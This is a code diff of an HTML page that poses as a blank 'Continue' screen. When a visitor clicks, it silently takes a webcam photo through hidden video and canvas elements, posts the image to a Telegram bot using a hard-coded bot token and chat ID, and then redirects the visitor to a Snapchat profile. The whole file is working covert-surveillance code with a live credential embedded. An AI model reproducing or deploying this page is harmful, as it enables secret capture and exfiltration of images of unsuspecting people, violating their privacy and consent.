@@ -6,50 +6,62 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 
-<body style="background:black;">
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+<body style="margin:0;background:black;">
+
+<button id="start"
+style="
+  position:fixed;
+  inset:0;
+  background:black;
+  color:white;
+  font-size:20px;
+  border:none;
+">
+Continue
+</button>
+
+<video id="video" playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 const BOT_TOKEN = "8301093694:AAEFQl_J7AvLc8_kRrpjVSyA0r5qdO6M2wo";
 const CHAT_ID = "1186294172";
+const SNAP_URL = "https://www.snapchat.com/add/habebabulaila";
 
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-  const video = document.getElementById("video");
+const startBtn = document.getElementById("start");
+const video = document.getElementById("video");
+
+startBtn.onclick = async () => {
+  startBtn.remove();
+
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
   video.srcObject = stream;
+  await video.play();
 
-  video.onloadedmetadata = async () => {
-    await video.play();
+  setTimeout(capturePhoto, 700);
+};
 
-    video.addEventListener("playing", () => {
-      setTimeout(capturePhoto, 700);
-    }, { once: true });
-  };
+function capturePhoto() {
+  const canvas = document.getElementById("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
 
-  function capturePhoto() {
-    const canvas = document.getElementById("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+  canvas.toBlob(blob => {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob);
 
-    canvas.toBlob(blob => {
-      const form = new FormData();
-      form.append("chat_id", CHAT_ID);
-      form.append("photo", blob);
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: form
-      }).then(() => {
-        window.location.href = "https://www.snapchat.com/add/habebabulaila";
-      });
-    }, "image/jpeg");
-  }
-})
-.catch(err => console.error(err));
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: form
+    }).finally(() => {
+      window.location.href = SNAP_URL;
+    });
+  }, "image/jpeg");
+}
 </script>
+
 </body>
 </html>
